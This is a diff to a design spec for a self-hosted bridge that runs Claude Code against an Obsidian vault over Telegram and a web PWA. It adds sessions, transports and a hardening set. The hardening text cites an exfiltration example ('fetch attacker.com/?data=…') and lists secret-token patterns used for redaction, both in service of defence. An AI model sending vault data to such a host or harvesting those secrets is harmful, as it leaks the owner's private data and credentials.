@@ -35,15 +35,18 @@ Working name for the component: **bridge** (directory `bridge/`, compose service
 - Multi-user auth, multi-chat routing, multi-project
 - Telegram forum topics
 - Multiple engines (Codex, Gemini CLI, …) — Claude Code via the Agent SDK only
-- Web dashboard, webhook API server
+- Webhook API for third-party integrations
 - TTS replies
 - Windows host support
+
+> **Scope change (July 2026):** a self-hosted **web client (PWA)** is now in scope as a first-class transport — see [web-client-spec.md](web-client-spec.md). Rationale: Telegram is officially blocked/degraded in Russia since February 2026, which forces the operator onto a VPN — defeating the AI-Tunnel motivation — and its single linear session model erases history that the web client can keep browsable. A public multi-user web SaaS remains a non-goal.
 
 ## Architecture
 
 | Decision | Choice | Rationale |
 |---|---|---|
 | Language | **TypeScript, Node 22** | SDK reference implementation is TS; both donor codebases (linuz90, nanoclaw) are TS; `node:22-alpine` base already in the stack |
+| Transports | **Pluggable `Transport` interface**; adapters: Telegram (grammY) and Web PWA ([web-client-spec.md](web-client-spec.md)), each behind a compose profile | Telegram availability in RU is degrading; the core must not care where messages come from |
 | Telegram library | **grammY** | Long-polling, typed, excellent middleware; used by the best donor |
 | Agent runtime | **`@anthropic-ai/claude-agent-sdk`**, public API only, version pinned | The whole premise; `_internal` is banned (RichardAtCT's breakage lesson) |
 | Process model | Single container, single process: grammY loop + per-chat turn queue + asyncio-style scheduler tick | One thing to deploy, one thing to healthcheck |
@@ -55,7 +58,10 @@ Component budget (~2.5–3k lines — slightly above the assessment's estimate b
 
 ```
 bridge/src/
-  transport/     grammY setup, claim binding, media handlers, coalescing   ~400
+  transport/     Transport interface + telegram adapter (grammY, claim,
+                 media handlers, coalescing)                               ~450
+  web/           web transport adapter: REST + WS API, auth, Web Push
+                 (frontend lives in web-client-spec.md, ~2.5k more)        ~600
   session/       session store, resume + fallbacks, turn queue, steering   ~450
   render/        markdown → Telegram HTML, fence-aware split, fallbacks    ~350
   status/        streaming progress message, reactions, error UX           ~300
@@ -105,7 +111,8 @@ Grouped F1–F13. Each carries the phase it lands in.
 
 ### F2. Sessions (Phase 0–1)
 
-- SDK `query()` with `resume`; session id persisted per chat.
+- **Sessions are first-class entities in the core**, not a per-chat pointer: `bridge-state/sessions/` holds `{id, title, sdk_session_ids, model, created, last_active, pinned, archived}` plus a display transcript (jsonl of messages, tool events, costs). The Telegram transport keeps its familiar linear UX — one *active* session, `/new` switches to a fresh one — but nothing is erased: old sessions stay browsable and resumable from the web client. One running turn per session; a global concurrency cap (default 1) protects the budget.
+- SDK `query()` with `resume`; SDK session id persisted per bridge session.
 - **Resume fallbacks from day one** (nanoclaw's lesson): on resume failure → start fresh, tell the user in one line, keep the old id in `session.json` history for manual recovery. No crash-on-oversized-session (Takopi #246 class).
 - Turn queue with steering: mid-turn messages offer **Steer** (inject into the running turn), **Queue** (run after), **Cancel current**.
 - **Session-size awareness**: the SDK reports usage per result; when a session crosses a configurable context threshold the bridge appends a one-line hint with a **Start fresh** button — the "context accumulates" foot-gun from [sessions.md](sessions.md) gets a UI instead of a docs paragraph.
@@ -137,6 +144,15 @@ Tool events map to human lines with the target path; text deltas replace the sta
   - Scheduler runs are checkpointed the same way.
   - Retention: prune snapshots older than `BRIDGE_CHECKPOINT_DAYS` (default 14).
   - This does **not** replace off-VPS backups ([backups.md](backups.md) stands), but it converts the most common failure — "the agent mangled a note and I noticed immediately" — from an incident into a two-tap recovery.
+
+**Hardening set (H1–H6).** What owning the agent loop makes possible beyond the baseline above — the security model shifts from "negotiate with the agent via instructions and fence it from outside" to "every action passes through code we control":
+
+- **H1. Confirmation gates for dangerous operations** (Phase 2). Via the SDK's permission callback: mass renames, moves/edits touching more than `BRIDGE_CONFIRM_FILE_THRESHOLD` files in one turn, or writes into configured sensitive folders pause the turn and ask through the active transport — inline buttons in Telegram, an actionable card + push notification on web ("Agent wants to move 14 files out of Projects/ — allow?"). Timeout → deny and tell the agent why. Impossible with a headless CLI bridge; the chat becomes the interactive approval channel `claude -p` never had.
+- **H2. `.agentignore` with real enforcement** (Phase 1, mandatory — improvement-plan D7.L1). One file at the vault root listing private folders, editable from Obsidian on the phone. The bridge expands it into PreToolUse deny rules for `Read`/`Grep`/`Glob`/`Bash` on start and on change — enforced before execution, not requested in CLAUDE.md. Replaces manual tmpfs mounts as the everyday privacy tool (tmpfs stays available for paranoid-tier folders).
+- **H3. Per-context permission profiles** (interface designed in Phase 1, enforced with the scheduler in Phase 3). Interactive chat gets full vault access; each scheduled task gets its own profile from its YAML header: `morning-digest` — read-only plus write to `Daily/`, `inbox-cleanup` — write only to `Inbox/` and `.trash/`. Shrinks the blast radius precisely where nobody is watching: unattended night runs.
+- **H4. Rate limiting and anti-runaway** (Phase 2). `BRIDGE_TURNS_PER_HOUR`, `BRIDGE_MAX_TOOL_CALLS_PER_TURN`, and a mutation circuit-breaker: more than N writes/edits in one turn aborts the turn, checkpoints make it recoverable, and the operator gets pinged. Closes the README's honest "Takopi has no built-in rate limiter" gap.
+- **H5. Egress visibility and allowlist** (Phase 3, ships with the url-summarizer). Every `WebFetch`/`WebSearch` URL is written to the audit log (exfiltration via "fetch attacker.com/?data=…" becomes at least visible); `WebFetch` is denied to the main agent and allowed only inside the read-only subagent; optional `BRIDGE_EGRESS_ALLOWLIST` (domain list) turns visibility into blocking without giving up the save-articles feature. The full network-level allowlist (improvement-plan D6.3) remains a separate, stricter compose option.
+- **H6. Outbound secret redaction** (Phase 2). Before any reply leaves for a transport, a cheap regex pass masks known secret shapes (`sk-ant-…`, `ghp_…`, private key blocks, bot tokens). If the agent quotes a key it stumbled on in a note, it reaches the chat masked. Detector patterns shared with the Phase 3 `secret-scan` scheduled task.
 
 ### F6. Money: cost visibility and budget guard (Phase 2)
 
@@ -192,6 +208,8 @@ Existing `.env` files keep working. The bridge reads the current surface and add
 | `ANTHROPIC_API_KEY` | Honored (Anthropic direct) |
 | `ANTHROPIC_BASE_URL`, `ANTHROPIC_AUTH_TOKEN` | **New**: Anthropic-compatible providers (AI Tunnel etc.); when `ANTHROPIC_AUTH_TOKEN` is set, `ANTHROPIC_API_KEY` is ignored and never forwarded |
 | `BRIDGE_LOCALE`, `BRIDGE_DAILY_BUDGET_USD`, `BRIDGE_MONTHLY_BUDGET_USD`, `BRIDGE_CHECKPOINT_DAYS`, `BRIDGE_KILL_PHRASE`, `BRIDGE_REACTIONS`, `BRIDGE_COST_FOOTER` | **New**, all with safe defaults |
+| `BRIDGE_CONFIRM_FILE_THRESHOLD` (H1), `BRIDGE_TURNS_PER_HOUR`, `BRIDGE_MAX_TOOL_CALLS_PER_TURN` (H4), `BRIDGE_EGRESS_ALLOWLIST` (H5), `BRIDGE_REDACT_SECRETS` (H6, default on) | **New**, hardening set |
+| `BRIDGE_WEB_*` (web transport: origin, auth, push) | **New**, defined in [web-client-spec.md](web-client-spec.md#environment) |
 
 Volumes: same `./vault`; `./bridge-state` replaces `./takopi-state` (migration note in cutover docs — only `chat_id` is worth carrying over, and the installer does it automatically). **No secrets are ever written to the state volume** — this closes audit finding S2 by construction.
 
@@ -209,13 +227,14 @@ The no-tests status quo (audit 1.4) does not carry over. Minimum bar per phase:
 
 | Phase | Content | Exit criteria | Effort |
 |---|---|---|---|
-| **0 — Spike** | Text-only: polling → SDK `query()` + resume → HTML render/split → reply. Runs as compose profile `bridge` with a separate test bot token, side-by-side with Takopi on the same vault (read-only allowlist). Renderer/splitter tests. | Round-trip conversation with continuity across restarts; honest feel-check vs Takopi. **Stop here if it feels worse.** | 2–4 days |
-| **1 — Parity+** | Claim binding, `/new` `/cancel`, turn queue + steering buttons, streaming status, reactions, error UX, voice, forward coalescing, backlog processing, PreToolUse enforcement + audit + kill-phrase, env compatibility, localization, E2E suite | Daily driver replacing the used Takopi subset; existing `.env` works unchanged; write access enabled | 1–2 weeks |
-| **2 — Safety & money** | Checkpoints + `/undo` + `/diff`, budget guard + `/usage` + cost footer, `/status`, `/model`, session-size hints, media groups, `/reasoning` | The two headline differentiators (recoverable vault, hard budget) live | ~1 week |
-| **3 — Agentic** | MCP tools (`ask_user`, `send_file`, `schedule_task`), scheduler + digest/heartbeat/cleanup templates, `url-summarizer` subagent, photos/documents, skills registry, memory templates | The Stage 3 feature set nothing else offers in one place | 1–2 weeks |
+| **0 — Spike** | Text-only: polling → SDK `query()` + resume → HTML render/split → reply, **behind the `Transport` interface from day one**. Runs as compose profile `bridge` with a separate test bot token, side-by-side with Takopi on the same vault (read-only allowlist). Renderer/splitter tests. | Round-trip conversation with continuity across restarts; honest feel-check vs Takopi. **Stop here if it feels worse.** | 2–4 days |
+| **1 — Parity+** | Claim binding, `/new` `/cancel`, multi-session store, turn queue + steering buttons, streaming status, reactions, error UX, voice, forward coalescing, backlog processing, PreToolUse enforcement + audit + kill-phrase, **`.agentignore` enforcement (H2)**, permission-profile interface (H3 design), env compatibility, localization, E2E suite | Daily driver replacing the used Takopi subset; existing `.env` works unchanged; write access enabled | 1–2 weeks |
+| **2 — Safety & money** | Checkpoints + `/undo` + `/diff`, budget guard + `/usage` + cost footer, **confirmation gates (H1)**, **rate limiting + anti-runaway (H4)**, **outbound secret redaction (H6)**, `/status`, `/model`, session-size hints, media groups, `/reasoning` | The two headline differentiators (recoverable vault, hard budget) live, plus the hardening core | ~1.5 weeks |
+| **3 — Agentic** | MCP tools (`ask_user`, `send_file`, `schedule_task`), scheduler + digest/heartbeat/cleanup templates with **per-task permission profiles (H3)**, `url-summarizer` subagent + **egress audit/allowlist (H5)**, photos/documents, skills registry, memory templates | The Stage 3 feature set nothing else offers in one place | 1–2 weeks |
+| **W — Web client** | Parallel track, starts after Phase 1; phases W0–W3 defined in [web-client-spec.md](web-client-spec.md) | Android PWA daily driver: capture via share sheet, browsable sessions, diff workbench | 3–4 weeks parallel |
 | **4 — Cutover** | Bridge becomes compose default; Takopi demoted to a fallback profile for one release, then `docs/legacy`; state migration; docs rewrite (sessions, security, configuration); CHANGELOG major | One release shipping both; the next shipping bridge-only | ~1 week incl. docs |
 
-Total: **5–7 weeks part-time**, usable daily driver after Phase 1 (~2 weeks in). Order within phases is flexible; the phase *gates* are not — no write access before the safety hooks exist, no cutover before the E2E suite is green.
+Total: **6–8 weeks part-time** for the bridge core, usable daily driver after Phase 1 (~2 weeks in); the web client runs as a parallel track once the core API is stable. Order within phases is flexible; the phase *gates* are not — no write access before the safety hooks exist, no cutover before the E2E suite is green.
 
 ## Risks
 
